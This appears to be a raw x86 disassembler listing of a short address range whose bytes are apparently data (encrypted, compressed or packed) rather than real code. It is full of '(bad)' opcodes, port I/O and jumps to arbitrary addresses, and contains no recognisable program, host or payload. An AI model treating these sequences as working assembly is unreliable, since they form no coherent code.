  41bb3b:	retf   0xe3f8
  41bb3e:	stc    
  41bb3f:	neg    esp
  41bb41:	pop    es
  41bb42:	(bad)  
  41bb44:	(bad)  
  41bb45:	xlat   BYTE PTR ds:[ebx]
  41bb46:	aam    0xa
  41bb48:	sti    
  41bb49:	retf   
  41bb4a:	in     eax,0xb
  41bb4c:	in     al,dx
  41bb4d:	out    0xdd,al
  41bb4f:	iret   
  41bb50:	loope  0x41bb21
  41bb52:	shl    esp,0xc1
  41bb55:	stc    
  41bb56:	dec    cl
  41bb58:	mov    ebx,0xdff4d3bc
  41bb5d:	(bad)  
  41bb5f:	clc    
  41bb60:	cmc    
  41bb61:	add    eax,ebx
  41bb63:	fcmovnb st,st(5)
  41bb65:	in     al,0xef
  41bb67:	jmp    0x41bb4e
  41bb69:	(bad)  
  41bb6a:	or     ebp,ebx
  41bb6c:	in     eax,0xf0
  41bb6e:	test   al,0xd1
  41bb70:	mov    esi,0xbaf6d0e4
  41bb76:	shr    dl,1
  41bb78:	jmp    0xd5ed:0xdfd8d1e3
  41bb7f:	cmc    
  41bb80:	in     eax,dx
  41bb81:	test   DWORD PTR [ecx],0xd7c400c3
  41bb87:	cli    
  41bb88:	jmp    0x41bb71
  41bb8a:	or     eax,0xb1c5e1d9
  41bb8f:	(bad)
  41bb92:	mov    ebp,0xd5cab0b0
  41bb98:	rcl    ecx,1
  41bb9a:	call   0xe033ba73
  41bb9f:	(bad)  
  41bba0:	repnz sti 
  41bba2:	fsubp  st(2),st
  41bba4:	fiadd  WORD PTR [ebx]
  41bba6:	clc    
  41bba7:	out    dx,eax
  41bba8:	out    dx,eax
  41bba9:	stc    
  41bbaa:	fmul   st(4),st
  41bbac:	jecxz  0x41bb76
  41bbae:	ret    0xacaf
  41bbb1:	mov    bl,0xef
  41bbb3:	rol    edi,1
  41bbb5:	mov    edx,0xf8cad6ec
  41bbba:	(bad)  
  41bbbc:	aam    0xdf
  41bbbe:	rol    cl,cl
  41bbc0:	int3   
  41bbc1:	mov    edx,0xf7c3e5d1
  41bbc6:	add    dl,ah
  41bbc8:	sti    
  41bbc9:	push   es
  41bbca:	lds    eax,FWORD PTR [ecx]
  41bbcc:	mov    ebp,0xd2c4eed1
  41bbd2:	mov    bh,0xc2
  41bbd4:	rcl    ecx,0xb7
  41bbd7:	mov    edx,0xfbe2e9b3
  41bbdc:	enter  0xdce1,0xc1
  41bbe0:	mov    ebp,0xc1fad1e0
  41bbe5:	ror    DWORD PTR [edx],0x2
  41bbe8:	stc    
  41bbe9:	fld    DWORD PTR ds:0xdcd3cdd9
  41bbef:	aad    0xe0
  41bbf1:	int3   
  41bbf2:	repz mov al,0xea
  41bbf5:	mov    ah,0xb7
  41bbf7:	iret   
  41bbf8:	mov    bl,0xec
  41bbfa:	retf   
  41bbfb:	neg    bh
  41bbfd:	int3   
  41bbfe:	rol    DWORD PTR [edi],1
  41bc00:	not    ebp
  41bc02:	test   DWORD PTR [edx],0xf5d6c0
  41bc08:	fmul   DWORD PTR [edx]
  41bc0a:	iret   
  41bc0b:	into   
  41bc0c:	bnd call 0xd02bb3f9
  41bc12:	cmc    
  41bc13:	lock repnz retf 0xd2cf
  41bc18:	in     eax,0xf9
  41bc1a:	mov    ecx,0x307bafc
  41bc1f:	add    ch,ah
  41bc21:	(bad)  
  41bc23:	jecxz  0x41bc20
  41bc25:	call   0x620ca09
  41bc2a:	paddusw mm5,QWORD PTR [ebp-0x3a184853]
  41bc31:	(bad)
  41bc34:	sti    
  41bc35:	jmp    0xd2109008
  41bc3a:	call   0xf01a8c3a
  41bc3f:	loope  0x41bc39
  41bc41:	jmp    0x41bbff
  41bc43:	test   BYTE PTR [ebx],0xe3
  41bc46:	leave  
  41bc47:	add    BYTE PTR [edi],al
  41bc49:	pop    es
  41bc4a:	std    
  41bc4b:	(bad)  
  41bc4d:	mov    bl,0xc5
  41bc4f:	scas   eax,DWORD PTR es:[edi]
  41bc50:	mov    dl,0xea
  41bc52:	rol    dh,0xca
  41bc55:	sti    
  41bc56:	jmp    0xeaf4924a
  41bc5b:	div    bh
  41bc5d:	mov    ecx,0xf1ecf5f5
  41bc62:	ret    0xbdc
  41bc65:	add    edi,ebx
  41bc67:	lds    eax,FWORD PTR [edx]
  41bc69:	(bad)  
  41bc6a:	sti    
  41bc6b:	add    ch,ch
  41bc6d:	jmp    0xdd066f23
  41bc72:	jmp    0x41bc3d
  41bc74:	retf   
  41bc75:	out    dx,eax
  41bc76:	shr    eax,cl
  41bc78:	mov    dh,0xc8
  41bc7a:	stc    
  41bc7b:	mov    edi,0xdedee1dd
  41bc80:	mov    esp,0x705f3
  41bc85:	leave  
  41bc86:	add    esp,eax
  41bc88:	add    esp,edi
  41bc8a:	or     dh,bl
  41bc8c:	jmp    0xd4b6:0xb0acd6d2
  41bc93:	iret   
  41bc94:	in     eax,0xea
  41bc96:	mov    edi,0xebd7ebcb
  41bc9b:	mov    esi,0xdcdbe9
  41bca0:	cld    
  41bca1:	hlt    
  41bca2:	add    ebx,esi
  41bca4:	(bad)  
  41bca6:	out    dx,eax
  41bca7:	iret   
  41bca8:	fcmovu st,st(2)
  41bcaa:	(bad)  
  41bcab:	fadd   st(5),st
  41bcad:	(bad)  
  41bcae:	jmp    0xead0:0xdbe7f6e8
  41bcb5:	jmp    0x41bc92
  41bcb7:	fnstsw WORD PTR [ebx-0x481d0e2a]
  41bcbd:	mov    esp,0x5e6debd
  41bcc2:	xlat   BYTE PTR ds:[ebx]
  41bcc3:	fsubrp st(7),st
  41bcc5:	jmp    0x807c4c8
  41bcca:	in     al,0x12
  41bccc:	mov    bl,0xa8
  41bcce:	fucomip st,st(5)
  41bcd0:	mov    ch,0xc2
  41bcd2:	out    dx,al
  41bcd3:	mov    al,0xca
  41bcd5:	repnz out dx,al
  41bcd7:	fmul   st,st(1)
  41bcd9:	iret   
  41bcda:	out    dx,al
  41bcdb:	mov    edi,0x601d3d2
  41bce0:	lock mov ebp,0xe4d7d5df
  41bce6:	loope  0x41bcb3
  41bce8:	call   0xca0689e1
  41bced:	scas   eax,DWORD PTR es:[edi]
  41bcee:	repz iret 
  41bcf0:	jmp    0x41bca0
  41bcf2:	(bad)
  41bcf5:	(bad)  
  41bcf6:	rcl    ecx,cl
  41bcf8:	in     al,0xd2
  41bcfa:	loop   0x41bcfa
  41bcfc:	iret   
  41bcfd:	loope  0x41bcc2
  41bcff:	icebp  
  41bd00:	mov    esi,0xc2e4f3cc
  41bd05:	retf   0xe8d5
  41bd08:	pop    es
  41bd09:	or     bh,dh
  41bd0b:	fild   QWORD PTR [ecx+ebp*8-0x4f2d3911]
  41bd12:	mov    cl,0xe7
  41bd14:	mov    dl,0xd7
  41bd16:	aad    0xde
  41bd18:	clc    
  41bd19:	icebp  
  41bd1a:	icebp  
  41bd1b:	add    DWORD PTR [eax],eax
  41bd1d:	fdiv   st(3),st
  41bd1f:	dec    esp
  41bd21:	add    eax,0xc8c5e307
  41bd26:	jmp    0xacc0:0xd8e506ca
  41bd2d:	jmp    0x41bd00
  41bd2f:	retf   
  41bd30:	stos   DWORD PTR es:[edi],eax
  41bd31:	mul    cl
  41bd33:	(bad)
  41bd36:	mov    bh,0xf3
  41bd38:	repnz stc 
  41bd3a:	int3   
  41bd3b:	xlat   BYTE PTR ds:[ebx]
  41bd3c:	fndisi(8087 only) 
  41bd3e:	mov    ebp,0xc105dcc7
  41bd43:	jecxz  0x41bd3b
  41bd45:	(bad)  
  41bd46:	aam    0x3
  41bd48:	loopne 0x41bd29
  41bd4a:	jmp    0xe71ab029
  41bd4f:	repz (bad) 
  41bd51:	out    dx,eax
  41bd52:	call   0xb2358c21
  41bd57:	aad    0xd4
  41bd59:	in     al,dx
  41bd5a:	mov    ebx,0xee02bdfd
  41bd5f:	add    esp,ebp
  41bd61:	out    0xfe,eax
  41bd63:	rcr    bh,0xef
  41bd66:	(bad)  
  41bd67:	(bad)  
  41bd68:	aam    0xd8
  41bd6a:	(bad)  
  41bd6b:	cld    
  41bd6c:	mov    ecx,0xd4c6f1f0
  41bd71:	retf   0xbbc2
  41bd74:	shl    edi,1
  41bd76:	mov    ecx,0xeadfd2b0
  41bd7b:	jecxz  0x41bd38
  41bd7d:	xlat   BYTE PTR ds:[ebx]
  41bd7e:	mov    ch,0x3
  41bd80:	fcmovb st,st(3)
  41bd82:	xlat   BYTE PTR ds:[ebx]
  41bd83:	loop   0x41bd5a
  41bd85:	(bad)  
  41bd87:	(bad)  
  41bd89:	fadd   st(1),st
  41bd8b:	add    dh,cl
  41bd8d:	lock repnz in al,dx
  41bd90:	jecxz  0x41bd65
  41bd92:	ret    
  41bd93:	in     eax,dx
  41bd94:	int3   
  41bd95:	scas   al,BYTE PTR es:[edi]
  41bd96:	mov    dh,0xd9
  41bd98:	out    dx,eax
  41bd99:	xlat   BYTE PTR ds:[ebx]
  41bd9a:	(bad)  
  41bd9b:	sar    bh,1
  41bd9d:	sar    BYTE PTR [ebp+eiz*8-0x39fd3a3f],1
  41bda4:	sti    
  41bda5:	push   es
  41bda6:	fucom  st(2)
  41bda8:	out    0x0,eax
  41bdaa:	into   
  41bdab:	int3   
  41bdac:	mov    ebp,0xc6c4cfcb
  41bdb1:	jmp    0xeaf2:0xdbf1c6c7
  41bdb8:	aam    0xed
  41bdba:	mov    eax,0x6b9f8cc
  41bdbf:	shl    ebx,0xd1
  41bdc2:	repnz icebp 
  41bdc4:	or     cl,dl
  41bdc6:	clc    
  41bdc7:	stc    
  41bdc8:	in     eax,dx
  41bdc9:	out    dx,eax
  41bdca:	push   es
  41bdcb:	adc    bl,cl
  41bdcd:	loop   0x41bda6
  41bdcf:	jmp    0xc93294c0
  41bdd4:	int    0xe6
  41bdd6:	(bad)  
  41bdd7:	jmp    0xf60596c4
  41bddc:	add    bl,cl
  41bdde:	(bad)  
  41bddf:	fstp   st(0)
  41bde1:	mov    edx,0x3dafbeb
  41bde6:	mov    BYTE PTR [eax],0xc4
  41bde9:	vpsubusw ymm6,ymm3,ymm0
  41bded:	shl    edx,1
  41bdef:	mov    dl,0xac
  41bdf1:	loop   0x41bdda
  41bdf3:	int    0xb2
  41bdf5:	aad    0xb1
  41bdf7:	(bad)  
  41bdf9:	jecxz  0x41bde3
  41bdfb:	ret    0xd5fd
  41bdfe:	mov    eax,0xd1ddedf5
  41be03:	loopne 0x41bddf
  41be05:	enter  0xfd05,0xe2
  41be09:	loop   0x41bdcc
  41be0b:	jmp    0xc0ad:0xbedcb1c8
  41be12:	aam    0xc4
  41be14:	sti    
  41be15:	not    edi
  41be17:	mov    al,0xbb
  41be19:	rcr    dh,1
  41be1b:	rcl    cl,1
  41be1d:	cmc    
  41be1e:	sar    ah,0x3
  41be21:	aad    0xc3
  41be23:	(bad)  
  41be24:	fcomp  st(3)
  41be26:	or     bl,ch
  41be28:	add    esp,ecx
  41be2a:	or     al,ah
  41be2c:	test   al,0xac
  41be2e:	lods   al,BYTE PTR ds:[esi]
  41be2f:	scas   eax,DWORD PTR es:[edi]
  41be30:	loop   0x41bde3
  41be32:	call   0xf9f28df7
  41be37:	retf   0xf0e9
  41be3a:	into   
  41be3b:	mov    ebx,0xc002cef1
  41be40:	repnz add al,0xde
  41be43:	ret    
  41be44:	pop    es
  41be45:	xlat   BYTE PTR ds:[ebx]
  41be46:	fsubr  st,st(1)
  41be48:	or     bl,al
  41be4a:	clc    
  41be4b:	or     edi,DWORD PTR [ebp+ebp*8-0x34335713]
  41be52:	(bad)  
  41be53:	in     eax,dx
  41be54:	lock mov dl,0xda
  41be57:	mov    dh,0xfb
  41be59:	cmc    
  41be5a:	into   
  41be5b:	out    dx,eax
  41be5c:	shr    ch,1
  41be5e:	cld    
  41be5f:	std    
  41be60:	mov    edi,0xdfdbd2eb
  41be65:	enter  0xe6e3,0xc4
  41be69:	(bad)  
  41be6a:	call   0xbd30b175
  41be6f:	ret    0xe6ab
  41be72:	into   
  41be73:	enter  0xb5b0,0xd9
  41be77:	cmc    
  41be78:	shl    esp,1
  41be7a:	aam    0xbd
  41be7c:	clc    
  41be7d:	(bad)  
  41be7f:	in     eax,dx
  41be80:	fscale 
  41be82:	or     ebx,ebx
  41be84:	(bad)  
  41be85:	(bad)  
  41be87:	out    0xc9,al
  41be89:	(bad)
  41be8c:	out    0xed,eax
  41be8e:	loop   0x41be5c
  41be90:	mov    ch,0xc3
  41be92:	loope  0x41be45
  41be94:	retf   0xb8d7
  41be97:	mov    edx,0xf9dfb6fb
  41be9c:	idiv   BYTE PTR [edx-0x21200312]
  41bea2:	sar    dl,cl
  41bea4:	(bad)  
  41bea5:	test   BYTE PTR [edi],0xd8
  41bea8:	in     al,dx
  41bea9:	fiadd  DWORD PTR [esi]
  41beab:	int    0xeb
  41bead:	enter  0xa8f6,0xe1
  41beb1:	cmc    
  41beb2:	loope  0x41bea8
  41beb4:	into   
  41beb5:	shl    bh,0xff
  41beb8:	mov    ebx,0xbee2d4ca
  41bebd:	fstp   TBYTE PTR [ecx-0x43270308]
  41bec3:	fdiv   st(1),st
  41bec5:	clc    
  41bec6:	clc    
  41bec7:	add    bh,al
  41bec9:	add    edi,ecx
  41becb:	fsub   st(4),st
  41becd:	mov    al,0xcf
  41becf:	out    0xc6,eax
  41bed1:	into   
  41bed2:	out    dx,eax
  41bed3:	idiv   al
  41bed5:	jmp    0xdaf8:0xccd3cbd1
  41bedc:	sti    
  41bedd:	mov    eax,0x7d1ffbf
  41bee2:	add    bh,ah
  41bee4:	xlat   BYTE PTR ds:[ebx]
  41bee5:	mov    DWORD PTR [eax+eax*8],0x13ef0c0d
  41beec:	mov    eax,0xe9e1bee9
  41bef1:	loop   0x41bee3
  41bef3:	in     eax,dx
  41bef4:	in     eax,dx
  41bef5:	clc    
  41bef6:	cli    
  41bef7:	cli    
  41bef8:	in     al,0xdb
  41befa:	loop   0x41bef6
  41befc:	loop   0x41befa
  41befe:	inc    DWORD PTR ds:0xf6de02c2
  41bf04:	add    eax,0xd8e502c2
  41bf09:	pop    es
  41bf0a:	sti    
  41bf0b:	out    dx,eax
  41bf0c:	mov    bl,0xea
  41bf0e:	enter  0xd3d5,0xd6
  41bf12:	jecxz  0x41bef9
  41bf14:	in     al,0xf3
  41bf16:	shl    bl,cl
  41bf18:	sti    
  41bf19:	sti    
  41bf1a:	ror    cl,cl
  41bf1c:	add    ch,ah
  41bf1e:	shl    ecx,cl
  41bf20:	in     al,0xd2
  41bf22:	fdivr  st,st(1)
  41bf24:	(bad)  
  41bf25:	or     al,cl
  41bf27:	fmulp  st(2),st
  41bf29:	fiadd  DWORD PTR [esi+eiz*8]
  41bf2c:	int    0xc0
  41bf2e:	mov    bl,0xc6
  41bf30:	loop   0x41bedf
  41bf32:	mov    dh,0xb7
  41bf34:	out    0xb4,eax
  41bf36:	fdivp  st(6),st
  41bf38:	int3   
  41bf39:	mov    esp,0xcce3f3fb
  41bf3e:	cli    
  41bf3f:	hlt    
  41bf40:	add    ch,al
  41bf42:	(bad)  
  41bf44:	(bad)  
  41bf47:	(bad)  
  41bf48:	jmp    0xd2c0:0xec01fed4
  41bf4f:	in     al,dx
  41bf50:	(bad)  
  41bf51:	(bad)  [edx-0x54f3e4d]
  41bf57:	mov    edx,0xd8d6f5db
  41bf5c:	sar    edi,1
  41bf5e:	in     eax,dx
  41bf5f:	add    eax,DWORD PTR [eax]
  41bf61:	or     eax,DWORD PTR [eax+edi*4]
  41bf64:	(bad)  
  41bf65:	jmp    0x41bf6a
  41bf67:	dec    BYTE PTR [esp+ebp*8]
  41bf6a:	push   es
  41bf6b:	fsub   st(0),st
  41bf6d:	into   
  41bf6e:	loop   0x41bf38
  41bf70:	enter  0xb6c9,0xc9
  41bf74:	mov    dl,0xc9
  41bf76:	jmp    0xfd3d8835
  41bf7b:	in     al,dx
  41bf7c:	out    dx,al
  41bf7d:	shl    ebx,0xcd
  41bf80:	mov    edi,0xe50adeec
  41bf85:	mov    esi,0xeebfd01
  41bf8a:	push   es
  41bf8b:	rol    bh,0xe4
  41bf8e:	mul    esp
  41bf90:	out    0xb4,eax
  41bf92:	(bad)  
  41bf93:	out    dx,al
  41bf94:	(bad)  
  41bf95:	in     eax,dx
  41bf96:	mov    cl,0xee
  41bf98:	lock mov esp,0xdbf4d2d2
  41bf9e:	cli    
  41bf9f:	(bad)  
  41bfa1:	mov    ebp,0xd7f70bc7
  41bfa6:	add    edi,eax
  41bfa8:	fsubr  st,st(5)
  41bfaa:	into   
  41bfab:	add    edi,DWORD PTR [esi-0x43210916]
  41bfb1:	jmp    0xf1ca:0xebf5a8e1
  41bfb8:	ror    ebp,1
  41bfba:	fiadd  DWORD PTR [ebx]
  41bfbc:	test   ah,0xd1
  41bfbf:	push   esp
  41bfc1:	(bad)
  41bfc4:	loop   0x41bfb6
  41bfc6:	out    0xdb,eax
  41bfc8:	or     ebx,esi
  41bfca:	add    al,0xf2
  41bfcc:	stos   BYTE PTR es:[edi],al
  41bfcd:	(bad)  
  41bfce:	icebp  
  41bfcf:	shl    BYTE PTR [ebx-0x1b2a3532],cl
  41bfd5:	(bad)  
  41bfd6:	(bad)  
  41bfd8:	fmul   st,st(4)
  41bfda:	std    
  41bfdb:	(bad)  
  41bfdd:	loopne 0x41bfde
  41bfdf:	int3   
  41bfe0:	rcr    edi,0xdb
  41bfe3:	(bad)  
  41bfe4:	(bad)  
  41bfe6:	(bad)  
  41bfea:	std    
  41bfeb:	repz in al,dx
  41bfed:	test   eax,0xf2ead3bf
  41bff2:	(bad)  
  41bff3:	out    0xe0,al
  41bff5:	jmp    0xf4f89fe8
  41bffa:	ror    al,1
  41bffc:	iret   
  41bffd:	mov    eax,0xc0befbb9
  41c002:	fnstcw WORD PTR [eax-0x6f8393f]
  41c008:	retf   
  41c009:	or     eax,0xe4d0cae6
  41c00e:	xlat   BYTE PTR ds:[ebx]
  41c00f:	in     eax,dx
  41c010:	int3   
  41c011:	int    0xc1
  41c013:	(bad)  
  41c014:	out    dx,eax
  41c015:	stc    
  41c016:	shl    BYTE PTR [ecx+edx*8-0x32f2f2b],1
  41c01d:	enter  0xdbf3,0xd2
  41c021:	aam    0xdb
  41c023:	shl    ecx,1
  41c025:	retf   
  41c026:	call   0x93c8918
  41c02b:	adc    DWORD PTR [edx-0x501a1220],ebp
  41c031:	retf   
  41c032:	ror    ebp,0xd5
  41c035:	mov    bh,0xb9
  41c038:	(bad)  
  41c039:	in     al,dx
  41c03a:	fdivr  DWORD PTR [eax+ebx*8-0x1c1a2611]
  41c041:	(bad)  
  41c042:	jecxz  0x41c00f
  41c044:	(bad)  
  41c046:	or     al,BYTE PTR [ebx]
  41c048:	frstpm(287 only) 
  41c04a:	or     edx,ebp
  41c04c:	stos   DWORD PTR es:[edi],eax
  41c04d:	in     eax,0xc4
  41c04f:	retf   
  41c050:	in     eax,dx
  41c051:	mov    ah,0xcb
  41c053:	in     al,dx
  41c054:	mov    dh,0xb4
  41c056:	xlat   BYTE PTR ds:[ebx]
  41c057:	std    
  41c058:	(bad)  
  41c059:	mov    ebx,0xfee303d2
  41c05e:	not    ecx
  41c060:	ror    DWORD PTR [ebx],cl
  41c062:	or     esi,ecx
  41c064:	stc    
  41c065:	aad    0xdd
  41c067:	add    eax,0xfcfae5f8
  41c06c:	ror    dh,cl
  41c06e:	retf   0xe3a4
  41c071:	loop   0x41c03c
  41c073:	lock mov bl,0xec
  41c076:	fmul   st,st(4)
  41c078:	(bad)  
  41c079:	fsqrt  
  41c07b:	jecxz  0x41c04d
  41c07d:	int3   
  41c07e:	out    0xfd,al
  41c080:	aam    0xbe
  41c082:	rol    DWORD PTR [ebx],cl
  41c084:	add    bl,dl
  41c086:	out    dx,eax
  41c087:	or     esp,esp
  41c089:	add    edi,ebp
  41c08b:	stc    
  41c08c:	lock (bad) 
  41c08e:	mov    bl,0xa4
  41c090:	mov    cl,0xce
  41c092:	(bad)  
  41c093:	(bad)  
  41c094:	retf   
  41c095:	out    0xdf,al
  41c097:	out    dx,eax
  41c098:	jmp    0xdbf1:0xdcdbdece
  41c09f:	hlt    
  41c0a0:	rol    BYTE PTR [ecx],1
  41c0a2:	fcom   st(7)
  41c0a4:	cli    
  41c0a5:	cld    
  41c0a6:	retf   
  41c0a7:	les    ecx,FWORD PTR [edi]
  41c0a9:	(bad)  
  41c0ab:	or     ebx,ecx
  41c0ad:	fnsave [eax-0x1b4d1337]
  41c0b3:	lock hlt 
  41c0b5:	cli    
  41c0b6:	int    0xcf
  41c0b8:	jmp    0x41c0b0
  41c0ba:	(bad)  
  41c0bb:	mov    edx,0xbcd7dbcd
  41c0c0:	ret    
  41c0c1:	cli    
  41c0c2:	retf   
  41c0c3:	push   es
  41c0c4:	rcr    esi,0xfd
  41c0c7:	push   cs
  41c0c8:	(bad)  [esi]
  41c0ca:	(bad)  
  41c0cc:	jmp    0xb2dc:0xc9c9f2ec
  41c0d3:	(bad)  
  41c0d4:	cmc    
  41c0d5:	icebp  
  41c0d6:	in     al,0xfd
  41c0d8:	(bad)  
  41c0d9:	repz loop 0x41c097
  41c0dc:	lock fld QWORD PTR [edi]
  41c0df:	rcr    eax,1
  41c0e1:	fcom   st(2)
  41c0e3:	loop   0x41c0ed
  41c0e5:	(bad)  
  41c0e6:	jmp    0xca1ba9ee
  41c0eb:	add    esi,edx
  41c0ed:	scas   eax,DWORD PTR es:[edi]
  41c0ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c0ef:	leave  
  41c0f0:	int3   
  41c0f1:	jmp    0xea2bb2ab
  41c0f6:	icebp  
  41c0f7:	int    0xf6
  41c0f9:	cli    
  41c0fa:	enter  0xd7e2,0xc3
  41c0fe:	hlt    
  41c0ff:	in     eax,0xf2
  41c101:	(bad)  
  41c103:	(bad)  
  41c104:	cmc    
  41c105:	stc    
  41c106:	add    eax,0xfe0eabc
  41c10b:	in     eax,dx
  41c10c:	ret    
  41c10d:	mov    cl,0xb7
  41c10f:	faddp  st(4),st
  41c111:	mov    dh,0xc0
  41c113:	loope  0x41c0f5
  41c115:	jmp    0xf51391e6
  41c11a:	(bad)  
  41c11c:	fcmovu st,st(2)
  41c11e:	mov    ch,0xd3
  41c120:	int    0xf8
  41c122:	add    al,0xe3
  41c124:	loop   0x41c106
  41c126:	jmp    0xe329970e
  41c12b:	in     eax,dx
  41c12c:	mov    eax,0xe9ede0d0
  41c131:	mov    esp,0xdaf6f2a9
  41c136:	fstp   TBYTE PTR [eax-0x8442628]
  41c13c:	hlt    
  41c13d:	mov    edi,0xf40001fa
  41c142:	out    0xd7,al
  41c144:	call   0xc51ca711
  41c149:	std    
  41c14a:	in     eax,dx
  41c14b:	fdiv   st,st(3)
  41c14d:	out    0xed,eax
  41c14f:	mov    bh,0xf3
  41c151:	loopne 0x41c0ff
  41c153:	mov    dl,0xb0
  41c155:	mov    ecx,0xf6feddff
  41c15a:	sti    
  41c15b:	shl    esi,cl
  41c15d:	aam    0xf4
  41c15f:	xlat   BYTE PTR ds:[ebx]
  41c160:	icebp  
  41c161:	ret    
  41c162:	fnop   
  41c164:	call   0xfc4d9c63
  41c169:	cli    
  41c16a:	shr    ebp,cl
  41c16c:	ror    dl,0xdd
  41c16f:	icebp  
  41c170:	shr    ch,cl
  41c172:	call   0xd80c8732
  41c177:	(bad)  
  41c178:	sti    
  41c179:	mov    ch,0xb5
  41c17b:	mov    ebx,0xe3bddecf
  41c180:	in     eax,dx
  41c181:	(bad)  
  41c182:	repz add eax,0xddc6f8d5
  41c188:	add    al,0xfb
  41c18a:	int    0x1
  41c18c:	jmp    0xcaef8f80
  41c191:	retf   
  41c192:	rcl    edi,cl
  41c194:	xlat   BYTE PTR ds:[ebx]
  41c195:	mov    cl,0xea
  41c197:	mov    dh,0xc8
  41c199:	mov    edi,0xee03faeb
  41c19e:	add    BYTE PTR [eax-0x9462d13],bh
  41c1a4:	add    eax,0x1ce0ff4
  41c1a9:	out    dx,al
  41c1aa:	push   es
  41c1ab:	or     cl,cl
  41c1ad:	int3   
  41c1ae:	(bad)  
  41c1af:	rol    ch,1
  41c1b1:	sti    
  41c1b2:	lock mov al,0xf8
  41c1b5:	mov    eax,0xb6f2c6e9
  41c1ba:	(bad)  
  41c1bc:	fnstenv [esi-0x202c2807]
  41c1c2:	icebp  
  41c1c3:	fld    QWORD PTR [esi]
  41c1c5:	in     al,0xc1
  41c1c7:	out    dx,eax
  41c1c8:	aam    0xa
  41c1ca:	fucomip st,st(4)
  41c1cc:	int3   
  41c1cd:	fsubr  QWORD PTR [ecx-0x3652232b]
  41c1d3:	(bad)  
  41c1d4:	retf   
  41c1d5:	aad    0xd7
  41c1d7:	call   esp
  41c1d9:	in     eax,dx
  41c1da:	in     al,dx
  41c1db:	loope  0x41c1c9
  41c1dd:	in     al,dx
  41c1de:	hlt    
  41c1df:	fild   WORD PTR [edx]
  41c1e1:	cmc    
  41c1e2:	in     eax,0xf0
  41c1e4:	or     ah,bh
  41c1e6:	in     eax,0x6
  41c1e8:	(bad)
  41c1eb:	loopne 0x41c1b8
  41c1ed:	mov    dl,0xf7
  41c1ef:	jmp    0xf3c7:0xdbe5e8c8
  41c1f6:	(bad)
  41c1f9:	call   0xe316b7ed
  41c1fe:	loope  0x41c1fd
  41c200:	cmc    
  41c201:	cli    
  41c202:	(bad)  
  41c203:	test   bl,0xc6
  41c206:	retf   
  41c207:	call   0xea0abb1b
  41c20c:	into   
  41c20d:	xlat   BYTE PTR ds:[ebx]
  41c20e:	in     al,0xaf
  41c210:	mov    dl,0xd6
  41c212:	shl    DWORD PTR [eax-0x161b040e],1
  41c218:	(bad)  
  41c21a:	fxtract 
  41c21c:	sar    DWORD PTR [edx-0x2f3c0e05],0xf2
  41c223:	fadd   st,st(3)
  41c225:	fdivrp st(4),st
  41c227:	(bad)  
  41c228:	(bad)  
  41c229:	out    dx,eax
  41c22a:	or     al,0x5
  41c22c:	repz icebp 
  41c22e:	loop   0x41c1f6
  41c230:	hlt    
  41c231:	mov    bl,0xce
  41c233:	in     al,0xda
  41c235:	mov    eax,0xceebc8ee
  41c23a:	repnz out dx,al
  41c23c:	(bad)  
  41c23e:	loope  0x41c21c
  41c240:	rcr    edi,1
  41c242:	out    0xf6,eax
  41c244:	fcmovne st,st(3)
  41c246:	clc    
  41c247:	pop    es
  41c248:	cli    
  41c249:	cli    
  41c24a:	in     eax,0xde
  41c24c:	leave  
  41c24d:	jmp    0xd0fb:0xb4e6d0b0
  41c254:	fcmove st,st(3)
  41c256:	(bad)  
  41c257:	fcmovbe st,st(1)
  41c259:	jecxz  0x41c219
  41c25b:	mov    eax,0xfbf2dee8
  41c260:	int    0xf1
  41c262:	ror    ebx,1
  41c264:	cld    
  41c265:	jecxz  0x41c269
  41c267:	fisttp WORD PTR [ebx]
  41c269:	jmp    0x41c265
  41c26b:	add    DWORD PTR [esi-0x162f2f56],edi
  41c271:	ror    ch,1
  41c273:	int    0xee
  41c275:	jmp    0x43bb679
  41c27a:	sti    
  41c27b:	mov    edx,0xf8f3edde
  41c280:	sar    dl,cl
  41c282:	cmc    
  41c283:	(bad)  
  41c284:	cmc    
  41c285:	call   0xe724a598
  41c28a:	jecxz  0x41c29a
  41c28c:	scas   eax,DWORD PTR es:[edi]
  41c28d:	ret    
  41c28e:	jmp    0xad238a70
  41c293:	mov    dh,0xf3
  41c295:	iret   
  41c296:	in     eax,0xd2
  41c298:	call   0xf31dc599
  41c29d:	lock test BYTE PTR ds:0xfd04d5f8,0xc3
  41c2a5:	aam    0xeb
  41c2a7:	aad    0xf5
  41c2a9:	(bad)  
  41c2ab:	add    al,0xbf
  41c2ad:	int3   
  41c2ae:	(bad)
  41c2b1:	in     eax,0xcb
  41c2b3:	out    dx,eax
  41c2b4:	shl    bl,cl
  41c2b6:	rcr    edi,1
  41c2b8:	call   eax
  41c2ba:	test   bh,0xf5
  41c2bd:	fsubr  st(1),st
  41c2bf:	mov    eax,0xebc4c7d0
  41c2c4:	aam    0x2
  41c2c6:	cli    
  41c2c7:	add    al,0xe5
  41c2c9:	loopne 0x41c2c5
  41c2cb:	fdivr  QWORD PTR [esi-0x914141f]
  41c2d1:	mov    bl,0xcb
  41c2d3:	in     eax,0xda
  41c2d5:	jmp    0xb8be:0xd3d4dbc9
  41c2dc:	int3   
  41c2dd:	int    0xc1
  41c2df:	rcl    eax,0xd2
  41c2e2:	out    0xeb,al
  41c2e4:	out    0xe8,eax
  41c2e6:	loopne 0x41c2b2
  41c2e8:	clc    
  41c2e9:	in     eax,dx
  41c2ea:	push   cs
  41c2eb:	loop   0x41c2e0
  41c2ed:	icebp  
  41c2ee:	jmp    0x41c2da
  41c2f0:	enter  0xe7b7,0xc8
  41c2f4:	test   ebp,0xd0f8eade
  41c2fa:	(bad)  
  41c2fc:	sar    BYTE PTR [edx-0x27273ffe],cl
  41c302:	(bad)  
  41c303:	sti    
  41c304:	(bad)  
  41c306:	fsub   st,st(5)
  41c308:	dec    eax
  41c30a:	jmp    0xcafa9112
  41c30f:	out    dx,al
  41c310:	mov    dl,0xe1
  41c312:	mov    dh,0xf4
  41c314:	retf   0xcabb
  41c317:	mov    ecx,0xcab9b5d8
  41c31c:	fsqrt  
  41c31e:	(bad)  
  41c320:	cli    
  41c321:	in     al,dx
  41c322:	(bad)  
  41c323:	fld    QWORD PTR [ecx]
  41c325:	(bad)  
  41c327:	add    esp,ebx
  41c329:	fsubrp st(0),st
  41c32b:	or     eax,0xe9c6dfad
  41c330:	repz shl cl,1
  41c333:	bnd call 0xfd0c7c31
  41c339:	jmp    0xd245b41c
  41c33e:	fdivr  st,st(3)
  41c340:	rol    BYTE PTR [edx+ebx*8],cl
  41c343:	retf   0xe6dc
  41c346:	jecxz  0x41c333
  41c348:	out    dx,al
  41c349:	repz retf 
